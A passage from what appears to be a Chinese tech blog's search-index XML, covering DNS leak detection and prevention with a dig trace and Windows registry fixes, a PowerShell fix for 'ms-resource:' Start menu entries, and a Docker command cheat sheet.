vp97h3wjo2tvwaiv.4.browserleaks.org +trace<span class="token punctuation">;</span> <span class="token operator">&lt;&lt;</span><span class="token operator">&gt;&gt;</span> DiG <span class="token number">9.11</span>.4-P2-RedHat-9.11.4-26.P2.el7_9.9 <span class="token operator">&lt;&lt;</span><span class="token operator">&gt;&gt;</span> vp97h3wjo2tvwaiv.4.browserleaks.org +trace<span class="token punctuation">;</span><span class="token punctuation">;</span> global options: +cmd<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      m.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      b.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      j.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      k.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      a.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      i.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      l.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      f.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      h.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      c.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      d.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      e.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">65227</span>   IN      NS      g.root-servers.net.<span class="token builtin class-name">.</span>                       <span class="token number">151199</span>  IN      RRSIG   NS <span class="token number">8</span> <span class="token number">0</span> <span class="token number">518400</span> <span class="token number">20221015170000</span> <span class="token number">20221002160000</span> <span class="token number">18733</span> <span class="token builtin class-name">.</span> <span class="token punctuation">;</span><span class="token punctuation">;</span> Received <span class="token number">1097</span> bytes from <span class="token comment">############ in 1 ms</span>org.                    <span class="token number">172800</span>  IN      NS      a0.org.afilias-nst.info.org.                    <span class="token number">172800</span>  IN      NS      a2.org.afilias-nst.info.org.                    <span class="token number">172800</span>  IN      NS      b0.org.afilias-nst.org.org.                    <span class="token number">172800</span>  IN      NS      b2.org.afilias-nst.org.org.                    <span class="token number">172800</span>  IN      NS      c0.org.afilias-nst.info.org.                    <span class="token number">172800</span>  IN      NS      d0.org.afilias-nst.org.org.                    <span class="token number">86400</span>   IN      DS      <span class="token number">26974</span> <span class="token number">8</span> <span class="token number">2</span> 4FEDE294C53F438A158C41D39489CD78A86BEB0D8A0AEAFF14745C0D 16E1DE32org.                    <span class="token number">86400</span>   IN      RRSIG   DS <span class="token number">8</span> <span class="token number">1</span> <span class="token number">86400</span> <span class="token number">20221016050000</span> <span class="token number">20221003040000</span> <span class="token number">18733</span> <span class="token builtin class-name">.</span> OWW+5hUtp/RJHdlmhpLYp/HJu0wHBc5Dej7e1hfVR7ExyHEB8J+TQ0jB bMpeFDSXWGdcrBZKBJti2baczEbAyX5a4VOfBTzZuvjJaac3n1Yrywt/ APosXX7aaoghMK3GjyYhNzXp8L2XArSzwhQSvIL23yV4hay2pylN2+Vs msbktFoFwbh/tDsfxLwwb2WyQsefCsdFbjq8A2iNXpKRdUOFfxyvrk0W tU5YXkIv9ugfaSns2nhxtdlc5i1BlYigHEGn3dfkGu0SxzPCd2iAhPOT OLcwnPoIGGy9j/2ygA5lO6cwCl1+QZsl0OcT4RmBzFlAqztayQpEhhbq E+WsqQ<span class="token operator">==</span><span class="token punctuation">;</span><span class="token punctuation">;</span> Received <span class="token number">801</span> bytes from <span class="token number">192.58</span>.128.30<span class="token comment">#53(j.root-servers.net) in 20 ms</span>browserleaks.org.       <span class="token number">3600</span>    IN      NS      jim.ns.cloudflare.com.browserleaks.org.       <span class="token number">3600</span>    IN      NS      olga.ns.cloudflare.com.gdtpongmpok61u9lvnipqor8lra9l4t0.org. <span class="token number">3600</span> IN NSEC3 <span class="token number">1</span> <span class="token number">1</span> <span class="token number">0</span> 332539EE7F95C32A GDTREA8KMJ2RNEQEN4M2OGJ26KFSUKJ7 NS SOA RRSIG DNSKEY NSEC3PARAMgdtpongmpok61u9lvnipqor8lra9l4t0.org. <span class="token number">3600</span> IN RRSIG NSEC3 <span class="token number">8</span> <span class="token number">2</span> <span class="token number">3600</span> <span class="token number">20221024110145</span> <span class="token number">20221003100145</span> <span class="token number">29166</span> org. Eaiddx4+Bs1pQMMErGOSwNDd2GEujB9pDFk3HZNknU6qmMHR6YFZg23S Y8CXjHS5LB7mHaZMT5pzljoYWK1SgoFDiIQnCupU6US/b5ffqHGmVJJ1 vISQSHyuuesNByHElm8xI5kiUoRzAUihu89eWvkQWr8SErsl0s1aHQMG <span class="token assign-left variable">ugc</span><span class="token operator">=</span>g1pp7qved73244ihlfhn2ia1du4lmeji.org. <span class="token number">3600</span> IN NSEC3 <span class="token number">1</span> <span class="token number">1</span> <span class="token number">0</span> 332539EE7F95C32A G1PRVFB035RKNAATP3F56FTGJBA791F4 NS DS RRSIGg1pp7qved73244ihlfhn2ia1du4lmeji.org. <span class="token number">3600</span> IN RRSIG NSEC3 <span class="token number">8</span> <span class="token number">2</span> <span class="token number">3600</span> <span class="token number">20221022152911</span> <span class="token number">20221001142911</span> <span class="token number">29166</span> org. p12dxH6my1FVtA9aKbGn+p7eDAyu4wQpAeU41GzIeZV4WA8Olp99QFIk gUk/gkkkIMuca/z8YobKBlHWbh8oLJgjK//zZyIWswCpUCsgkA3vtc7M x3E0XOI135QucbO2ITzaLRqsQWkNvhEzvmnob4c6npJPCg3dU9Edbpvv <span class="token assign-left variable">N64</span><span class="token operator">=</span><span class="token punctuation">;</span><span class="token punctuation">;</span> Received <span class="token number">635</span> bytes from <span class="token number">199.249</span>.120.1<span class="token comment">#53(b2.org.afilias-nst.org) in 210 ms</span><span class="token number">4</span>.browserleaks.org.     <span class="token number">86400</span>   IN      NS      ns1.browserleaks.org.<span class="token number">4</span>.browserleaks.org.     <span class="token number">86400</span>   IN      NS      ns2.browserleaks.org.<span class="token punctuation">;</span><span class="token punctuation">;</span> Received <span class="token number">188</span> bytes from 2a06:98c1:50::ac40:2089<span class="token comment">#53(olga.ns.cloudflare.com) in 59 ms</span>vp97h3wjo2tvwaiv.4.browserleaks.org. <span class="token number">60</span> IN A    <span class="token number">165.22</span>.41.103<span class="token number">4</span>.browserleaks.org.     <span class="token number">3600</span>    IN      NS      ns1.browserleaks.org.4.browserleaks.org.<span class="token number">4</span>.browserleaks.org.     <span class="token number">3600</span>    IN      NS      ns2.browserleaks.org.4.browserleaks.org.<span class="token punctuation">;</span><span class="token punctuation">;</span> Received <span class="token number">257</span> bytes from <span class="token number">165.22</span>.41.103<span class="token comment">#53(ns2.browserleaks.org) in 240 ms</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>注意</p><pre class="line-numbers language-none"><code class="language-none">4.browserleaks.org.     3600    IN      NS      ns1.browserleaks.org.4.browserleaks.org.4.browserleaks.org.     3600    IN      NS      ns2.browserleaks.org.4.browserleaks.org.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>这两行NS记录，即所有 <strong>4.browserleaks.org.</strong> 的子域名由<strong>DNS 权威服务器</strong><code>ns1.browserleaks.org.4.browserleaks.org.</code>负责解析。这里很明显<code>ns1.browserleaks.org.4.browserleaks.org.</code>就负责记录请求过来的 DNS 服务器 IP，并通过之前随机生成子域名区分进行 DNS泄露检测的客户端。并将结果回报给 Web 前端。</p><h2 id="poc">PoC</h2><p>(To be continued)</p><h2 id="泄露途径">泄露途径</h2><h3 id="windows-dns-查询机制">Windows DNS 查询机制</h3><p>默认情况下，其实配置了路由跃点数/距离，Windows 依然会尝试尝试每个Adapter 下的缺省 DNS 地址，如果你使用的是 VPN隧道的话，那么很有可能会导致泄露</p><h4 id="解决方案">解决方案</h4><p>设置注册表：</p><pre class="line-numbers language-none"><code class="language-none">Key: HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows NT\DNSClientValue:  DisableSmartNameResolutionData:  1Key: HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Dnscache\ParametersValue: DisableParallelAandAAAAData:  1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ipv4-ipv6-双栈">IPv4 / IPv6 双栈</h3><p>这个问题较难解决，OS 和 Browser 对此的策略均有不同。</p><p>Chrome 中需关闭 <strong>Async DNS resolver</strong>：<a href="chrome://flags/#enable-async-dns"></a></p><h2 id="如何预防">如何预防</h2><ol type="1"><li>确保所有流量经过代理隧道</li><li>使用 DoH, DoT, DNSCrypt, YogaDNS 等安全解决方案</li><li>浏览器中关闭 WebRTC 等风险功能</li></ol><h2 id="工具">工具</h2><ul><li>https://yogadns.com/docs/dns-leak/</li><li>https://browserleaks.com/dns</li><li>https://bgp.tools/</li><li>https://github.com/mellow-io/mellow/issues/88</li><li>https://dnsleak.com/</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> VPN </tag>
            
            <tag> DNS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugFix记：Windows开始菜单出现ms-resource:</title>
      <link href="/2022/10/02/bugfix-ji-windows-kai-shi-cai-dan-chu-xian-ms-resource/"/>
      <url>/2022/10/02/bugfix-ji-windows-kai-shi-cai-dan-chu-xian-ms-resource/</url>
      
        <content type="html"><![CDATA[<h2 id="起因">起因</h2><p>多半是更改了区域设置或者语言之类的东西，影响到了UWP的文本资源。</p><h2 id="fix">Fix</h2><h3 id="方法1">方法1</h3><p>进入<code>%localappdata%\Packages\Microsoft.Windows.StartMenuExperienceHost_cw5n1h2txyewy</code>目录，删除Temp文件</p><h3 id="方法2">方法2</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-AppXPackage</span> <span class="token punctuation">|</span> <span class="token keyword">Foreach</span> <span class="token punctuation">{</span><span class="token function">Add-AppxPackage</span> <span class="token operator">-</span>DisableDevelopmentMode <span class="token operator">-</span>Register “$<span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">.</span>InstallLocation<span class="token punctuation">)</span>\AppXManifest<span class="token punctuation">.</span>xml”<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="方法3">方法3</h3><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">Get-AppxPackage</span> <span class="token operator">-</span>all <span class="token operator">*</span>HolographicFirstRun* <span class="token punctuation">|</span> <span class="token function">Remove-AppPackage</span> <span class="token operator">-</span>AllUsers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="原因">原因</h2><p>多半是因为从Win10起开始菜单被整合成了WindowsStartExperience的WinUI组件，撅弃了以往的资源调用方式，转向UWP所致。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Docker 常用命令</title>
      <link href="/2022/09/24/docker-chang-yong-ming-ling/"/>
      <url>/2022/09/24/docker-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<h1 id="docker-常用命令">Docker 常用命令</h1><h2 id="brief">Brief</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#info|version</span><span class="token function">docker</span> info       <span class="token comment">#显示docker的系统信息，包括镜像和容器的数量</span><span class="token function">docker</span> version    <span class="token comment">#显示docker的版本信息。</span><span class="token comment">#帮助命令</span><span class="token function">docker</span> 命令 <span class="token parameter variable">--help</span> <span class="token comment">#帮助命令</span><span class="token comment">#镜像命令</span><span class="token function">docker</span> images <span class="token comment">#查看所有本地主机上的镜像 可以使用docker image ls代替</span><span class="token function">docker</span> search <span class="token comment">#搜索镜像</span><span class="token function">docker</span> pull <span class="token comment">#下载镜像 docker image pull</span><span class="token function">docker</span> rmi <span class="token comment">#删除镜像 docker image rm</span><span class="token comment">#容器命令</span><span class="token function">docker</span> run 镜像id <span class="token comment">#新建容器并启动</span><span class="token function">docker</span> <span class="token function">ps</span> 列出所有运行的容器 <span class="token function">docker</span> container list<span class="token function">docker</span> <span class="token function">rm</span> 容器id <span class="token comment">#删除指定容器</span> <span class="token comment">#删除所有容器</span> <span class="token function">docker</span> <span class="token function">rm</span> <span class="token parameter variable">-f</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-aq</span><span class="token variable">)</span></span>    <span class="token comment">#删除所有的容器</span> <span class="token function">docker</span> <span class="token function">ps</span> <span class="token parameter variable">-a</span> -q<span class="token operator">|</span><span class="token function">xargs</span> <span class="token function">docker</span> <span class="token function">rm</span>  <span class="token comment">#删除所有的容器</span><span class="token comment">#启动和停止容器</span><span class="token function">docker</span> start 容器id <span class="token comment">#启动容器</span><span class="token function">docker</span> restart 容器id <span class="token comment">#重启容器</span><span class="token function">docker</span> stop 容器id <span class="token comment">#停止当前正在运行的容器</span><span class="token function">docker</span> <span class="token function">kill</span> 容器id <span class="token comment">#强制停止当前容器</span><span class="token comment">#退出容器</span><span class="token builtin class-name">exit</span>   <span class="token comment">#容器直接退出</span>ctrl +P +Q  <span class="token comment">#容器不停止退出  ---注意：这个很有用的操作</span><span class="token comment">#其他常用命令</span><span class="token function">docker</span> run <span class="token parameter variable">-d</span> 镜像名  <span class="token comment">#后台启动命令</span><span class="token function">docker</span> logs   <span class="token comment">#查看日志</span><span class="token function">docker</span> <span class="token function">top</span> 容器id  <span class="token comment">#查看容器中进程信息ps</span><span class="token function">docker</span> inspect 容器id  <span class="token comment">#查看镜像的元数据</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span>   <span class="token comment">#进入当前容器后开启一个新的终端，可以在里面操作。（常用）</span><span class="token function">docker</span> attach   <span class="token comment"># 进入容器正在执行的终端</span><span class="token function">docker</span> <span class="token function">cp</span> 容器id:容器内路径  主机目的路径 <span class="token comment">#从容器内拷贝到主机上</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="full-version">Full Version</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">docker</span> attach <span class="token comment">#连接到正在运行中的容器</span><span class="token function">docker</span> build <span class="token comment">#使用 Dockerfile 创建镜像</span><span class="token function">docker</span> builder <span class="token comment">#管理builds</span>    <span class="token function">docker</span> builder prune <span class="token comment">#清除build缓存</span><span class="token function">docker</span> checkpoint <span class="token comment">#管理checkpoints</span>    <span class="token function">docker</span> checkpoint create <span class="token comment">#从正在运行的容器创建检查点</span>    <span class="token function">docker</span> checkpoint <span class="token function">ls</span> <span class="token comment">#列出容器的检查点</span>    <span class="token function">docker</span> checkpoint <span class="token function">rm</span> <span class="token comment">#删除指定的检查点</span><span class="token function">docker</span> commit <span class="token comment">#从容器创建一个新的镜像</span><span class="token function">docker</span> config <span class="token comment">#管理Docker配置</span>    <span class="token function">docker</span> config create <span class="token comment">#创建配置文件</span>    <span class="token function">docker</span> config inspect <span class="token comment">#查看配置文件信息</span>    <span class="token function">docker</span> config <span class="token function">ls</span>  <span class="token comment">#显示docker里已经保存得配置文件</span>    <span class="token function">docker</span> config <span class="token function">rm</span>  <span class="token comment">#删除配置文件</span><span class="token function">docker</span> container <span class="token comment">#管理容器</span>    <span class="token function">docker</span> container prune <span class="token comment">#删除所有已停止的容器</span><span class="token function">docker</span> context <span class="token comment">#管理contexts</span>    <span class="token function">docker</span> context create <span class="token comment">#创建一个上下文</span>    <span class="token function">docker</span> context <span class="token builtin class-name">export</span> <span class="token comment">#将上下文导出到tar或kubecconfig文件中</span>    <span class="token function">docker</span> context <span class="token function">import</span> <span class="token comment">#从tar或zip文件导入上下文</span>    <span class="token function">docker</span> context inspect <span class="token comment">#在一个或多个上下文上显示详细信息</span>    <span class="token function">docker</span> context <span class="token function">ls</span>  <span class="token comment">#列出上下文</span>    <span class="token function">docker</span> context <span class="token function">rm</span>  <span class="token comment">#删除一个或多个上下文</span>    <span class="token function">docker</span> context update <span class="token comment">#更新</span>    <span class="token function">docker</span> context use  <span class="token comment">#设置当前docker的上下文</span><span class="token function">docker</span> <span class="token function">cp</span>  <span class="token comment">#用于容器与主机之间的数据拷贝</span><span class="token function">docker</span> create <span class="token comment">#创建一个新的容器但不启动它</span><span class="token function">docker</span> <span class="token function">diff</span>  <span class="token comment">#检查容器里文件结构的更改</span><span class="token function">docker</span> events <span class="token comment">#从服务器获取实时事件</span><span class="token function">docker</span> <span class="token builtin class-name">exec</span>  <span class="token comment">#在运行的容器中执行命令</span><span class="token function">docker</span> <span class="token builtin class-name">export</span> <span class="token comment">#将文件系统作为一个tar归档文件导出到STDOUT</span><span class="token function">docker</span> <span class="token function">history</span> <span class="token comment">#查看指定镜像的创建历史</span><span class="token function">docker</span> image <span class="token comment">#管理镜像</span>    <span class="token function">docker</span> image inspect <span class="token comment">#显示一个或多个镜像的元数据</span>    <span class="token function">docker</span> image <span class="token function">ls</span>   <span class="token comment">#列出本地镜像</span>    <span class="token function">docker</span> image prune  <span class="token comment">#删除没有使用的镜像</span>    <span class="token function">docker</span> image <span class="token function">rm</span>   <span class="token comment">#删除一个或多个镜像</span><span class="token function">docker</span> images <span class="token comment">#列出本地镜像</span><span class="token function">docker</span> <span class="token function">import</span> <span class="token comment">#从归档文件中创建镜像</span><span class="token function">docker</span> info  <span class="token comment">#显示 Docker 系统信息，包括镜像和容器数</span><span class="token function">docker</span> inspect <span class="token comment">#获取容器/镜像的元数据</span><span class="token function">docker</span> <span class="token function">kill</span>  <span class="token comment">#杀掉一个运行中的容器</span><span class="token function">docker</span> load  <span class="token comment">#导入使用 docker save 命令导出的镜像</span><span class="token function">docker</span> login <span class="token comment">#登陆到一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</span><span class="token function">docker</span> <span class="token builtin class-name">logout</span> <span class="token comment">#登出一个Docker镜像仓库，如果未指定镜像仓库地址，默认为官方仓库 Docker Hub</span><span class="token function">docker</span> logs  <span class="token comment">#获取容器的日志</span><span class="token function">docker</span> manifest <span class="token comment">#管理manifest(实验，不应用于生产环境)</span>    <span class="token function">docker</span> manifest annotate <span class="token comment">#向本地镜像清单添加附加信息</span>    <span class="token function">docker</span> manifest create  <span class="token comment">#创建用于注释和推入注册表的本地清单列表</span>    <span class="token function">docker</span> manifest inspect  <span class="token comment">#显示镜像清单或清单列表</span>    <span class="token function">docker</span> manifest push  <span class="token comment">#将清单列表推入仓库</span>    <span class="token function">docker</span> manifest <span class="token function">rm</span>   <span class="token comment">#从本地存储中删除一个或多个清单列表</span><span class="token function">docker</span> network <span class="token comment">#管理网络</span>    <span class="token function">docker</span> network connect  <span class="token comment">#将容器连接到网络</span>    <span class="token function">docker</span> network create  <span class="token comment">#创建一个网络</span>    <span class="token function">docker</span> network disconnect <span class="token comment">#断开容器的网络</span>    <span class="token function">docker</span> network inspect  <span class="token comment">#显示一个或多个网络的元数据</span>    <span class="token function">docker</span> network <span class="token function">ls</span>   <span class="token comment">#列出网络</span>    <span class="token function">docker</span> network prune  <span class="token comment">#删除所有没有使用的网络</span>    <span class="token function">docker</span> network <span class="token function">rm</span>   <span class="token comment">#删除一个或多个网络</span><span class="token function">docker</span> <span class="token function">node</span>  <span class="token comment">#管理集群(swarm)节点</span>    <span class="token function">docker</span> <span class="token function">node</span> demote   <span class="token comment">#从群集(swarm)管理器中降级一个或多个节点</span>    <span class="token function">docker</span> <span class="token function">node</span> inspect   <span class="token comment">#显示一个或多个节点的元数据</span>    <span class="token function">docker</span> <span class="token function">node</span> <span class="token function">ls</span>    <span class="token comment">#列出群集(swarm)中的节点</span>    <span class="token function">docker</span> <span class="token function">node</span> promote   <span class="token comment">#将一个或多个节点推入到群集管理器中</span>    <span class="token function">docker</span> <span class="token function">node</span> <span class="token function">ps</span>    <span class="token comment">#列出在一个或多个节点上运行的任务，默认为当前节点</span>    <span class="token function">docker</span> <span class="token function">node</span> <span class="token function">rm</span>    <span class="token comment">#从群集(swarm)删除一个或多个节点</span>    <span class="token function">docker</span> <span class="token function">node</span> update   <span class="token comment">#更新一个节点</span><span class="token function">docker</span> pause <span class="token comment">#暂停容器中所有的进程</span><span class="token function">docker</span> plugin <span class="token comment">#管理插件</span>    <span class="token function">docker</span> plugin create  <span class="token comment">#从rootfs和配置创建一个插件。插件数据目录必须包含config.json和rootfs目录。</span>    <span class="token function">docker</span> plugin disable  <span class="token comment">#禁用插件</span>    <span class="token function">docker</span> plugin <span class="token builtin class-name">enable</span>  <span class="token comment">#启用插件</span>    <span class="token function">docker</span> plugin inspect  <span class="token comment">#显示一个或多个插件的元数据</span>    <span class="token function">docker</span> plugin <span class="token function">install</span>  <span class="token comment">#安装一个插件</span>    <span class="token function">docker</span> plugin <span class="token function">ls</span>   <span class="token comment">#列出所有插件</span>    <span class="token function">docker</span> plugin push   <span class="token comment">#将插件推送到注册表</span>    <span class="token function">docker</span> plugin <span class="token function">rm</span>   <span class="token comment">#删除一个或多个插件</span>    <span class="token function">docker</span> plugin <span class="token builtin class-name">set</span>   <span class="token comment">#更改插件的设置</span>    <span class="token function">docker</span> plugin upgrade  <span class="token comment">#升级现有插件</span><span class="token function">docker</span> port  <span class="token comment">#列出指定的容器的端口映射，或者查找将PRIVATE_PORT NAT到面向公众的端口</span><span class="token function">docker</span> <span class="token function">ps</span>  <span class="token comment">#列出容器</span><span class="token function">docker</span> pull  <span class="token comment">#从镜像仓库中拉取或者更新指定镜像</span><span class="token function">docker</span> push  <span class="token comment">#将本地的镜像上传到镜像仓库,要先登陆到镜像仓库</span><span class="token function">docker</span> <span class="token function">rename</span> <span class="token comment">#重命名容器</span><span class="token function">docker</span> restart <span class="token comment">#重启容器</span><span class="token function">docker</span> <span class="token function">rm</span>  <span class="token comment">#删除一个或多个容器</span><span class="token function">docker</span> rmi  <span class="token comment">#删除一个或多个镜像</span><span class="token function">docker</span> run  <span class="token comment">#创建一个新的容器并运行一个命令</span><span class="token function">docker</span> save  <span class="token comment">#将指定镜像保存成 tar 归档文件</span><span class="token function">docker</span> search <span class="token comment">#从Docker Hub查找镜像</span><span class="token function">docker</span> secret <span class="token comment">#管理Docker secrets</span>    <span class="token function">docker</span> secret create <span class="token comment">#从文件或STDIN创建一个秘密作为内容</span>    <span class="token function">docker</span> secret inspect <span class="token comment">#显示有关一个或多个秘密的详细信息</span>    <span class="token function">docker</span> secret <span class="token function">ls</span>  <span class="token comment">#列出秘密</span>    <span class="token function">docker</span> secret <span class="token function">rm</span>  <span class="token comment">#删除一个或多个秘密</span><span class="token function">docker</span> <span class="token function">service</span> <span class="token comment">#管理服务</span>    <span class="token function">docker</span> <span class="token function">service</span> create <span class="token comment">#创建一个服务</span>    <span class="token function">docker</span> <span class="token function">service</span> inspect <span class="token comment">#查看服务的元数据</span>    <span class="token function">docker</span> <span class="token function">service</span> logs  <span class="token comment">#获取服务的日志</span>    <span class="token function">docker</span> <span class="token function">service</span> <span class="token function">ls</span>  <span class="token comment">#列出服务</span>    <span class="token function">docker</span> <span class="token function">service</span> <span class="token function">ps</span>  <span class="token comment">#列出一个或多个服务的任务</span>    <span class="token function">docker</span> <span class="token function">service</span> <span class="token function">rm</span>  <span class="token comment">#删除一个或多个服务</span>    <span class="token function">docker</span> <span class="token function">service</span> rollback <span class="token comment">#将更改恢复到服务的配置</span>    <span class="token function">docker</span> <span class="token function">service</span> scale <span class="token comment">#缩放一个或多个复制服务</span>    <span class="token function">docker</span> <span class="token function">service</span> update <span class="token comment">#更新服务</span><span class="token function">docker</span> stack <span class="token comment">#管理堆栈</span>    <span class="token function">docker</span> stack deploy  <span class="token comment">#部署新的堆栈或更新现有堆栈</span>    <span class="token function">docker</span> stack <span class="token function">ls</span>   <span class="token comment">#列出现有堆栈</span>    <span class="token function">docker</span> stack <span class="token function">ps</span>   <span class="token comment">#列出堆栈中的任务</span>    <span class="token function">docker</span> stack <span class="token function">rm</span>   <span class="token comment">#删除堆栈 </span>    <span class="token function">docker</span> stack services <span class="token comment">#列出堆栈中的服务</span><span class="token function">docker</span> start <span class="token comment">#启动一个或多个已经被停止的容器</span><span class="token function">docker</span> stats <span class="token comment">#显示容器的实时流资源使用统计信息</span><span class="token function">docker</span> stop  <span class="token comment">#停止一个运行中的容器</span><span class="token function">docker</span> swarm <span class="token comment">#管理集群(Swarm)</span>    <span class="token function">docker</span> swarm ca   <span class="token comment">#查看或旋转当前群集CA证书。此命令必须针对管理器节点</span>    <span class="token function">docker</span> swarm init  <span class="token comment">#初始化一个群集(Swarm)</span>    <span class="token function">docker</span> swarm <span class="token function">join</span>  <span class="token comment">#加入群集作为节点和/或管理器</span>    <span class="token function">docker</span> swarm join-token <span class="token comment">#管理加入令牌</span>    <span class="token function">docker</span> swarm leave  <span class="token comment">#离开群集(Swarm)</span>    <span class="token function">docker</span> swarm unlock  <span class="token comment">#解锁群集(Swarm)</span>    <span class="token function">docker</span> swarm unlock-key <span class="token comment">#管理解锁钥匙</span>    <span class="token function">docker</span> swarm update  <span class="token comment">#更新群集(Swarm)</span><span class="token function">docker</span> system <span class="token comment">#管理Docker</span>    <span class="token function">docker</span> system <span class="token function">df</span>  <span class="token comment">#显示docker磁盘使用情况</span>    <span class="token function">docker</span> system events <span class="token comment">#从服务器获取实时事件</span>    <span class="token function">docker</span> system info  <span class="token comment">#显示系统范围的信息</span>    <span class="token function">docker</span> system prune  <span class="token comment">#删除未使用的数据</span><span class="token function">docker</span> tag  <span class="token comment">#标记本地镜像，将其归入某一仓库</span><span class="token function">docker</span> <span class="token function">top</span>  <span class="token comment">#查看容器中运行的进程信息，支持 ps 命令参数</span><span class="token function">docker</span> trust <span class="token comment">#管理Docker镜像的信任</span>    <span class="token function">docker</span> trust inspect <span class="token comment">#返回有关key和签名的低级信息</span>    <span class="token function">docker</span> trust key  <span class="token comment">#管理登入Docker镜像的keys</span>     <span class="token function">docker</span> trust key generate <span class="token comment">#生成并加载签名密钥对</span>  <span class="token function">docker</span> trust key load  <span class="token comment">#加载私钥文件以进行签名</span>    <span class="token function">docker</span> trust revoke  <span class="token comment">#删除对镜像的认证</span>    <span class="token function">docker</span> trust sign  <span class="token comment">#镜像签名</span>    <span class="token function">docker</span> trust signer  <span class="token comment">#管理可以登录Docker镜像的实体</span>     <span class="token function">docker</span> trust signer <span class="token function">add</span>  <span class="token comment">#新增一个签名者</span>  <span class="token function">docker</span> trust signer remove <span class="token comment">#删除一个签名者</span><span class="token function">docker</span> unpause <span class="token comment">#恢复容器中所有的进程</span><span class="token function">docker</span> update <span class="token comment">#更新一个或多个容器的配置</span><span class="token function">docker</span> version <span class="token comment">#显示 Docker 版本信息</span><span class="token function">docker</span> volume <span class="token comment">#管理volumes</span>    <span class="token function">docker</span> volume create <span class="token comment">#创建一个卷</span>    <span class="token function">docker</span> volume inspect <span class="token comment">#显示一个或多个卷的元数据</span>    <span class="token function">docker</span> volume <span class="token function">ls</span>  <span class="token comment">#列出卷</span>    <span class="token function">docker</span> volume prune  <span class="token comment">#删除所有未使用的卷</span>    <span class="token function">docker</span> volume <span class="token function">rm</span>  <span class="token comment">#删除一个或多个卷</span><span class="token function">docker</span> <span class="token function">wait</span>  <span class="token comment">#阻塞运行直到容器停止，然后打印出它的退出代码</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> Docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>示波器观后感-FFT与吉布斯现象</title>
      <link href="/2022/09/23/shi-bo-qi-guan-hou-gan-fft-yu-ji-bu-si-xian-xiang/"/>
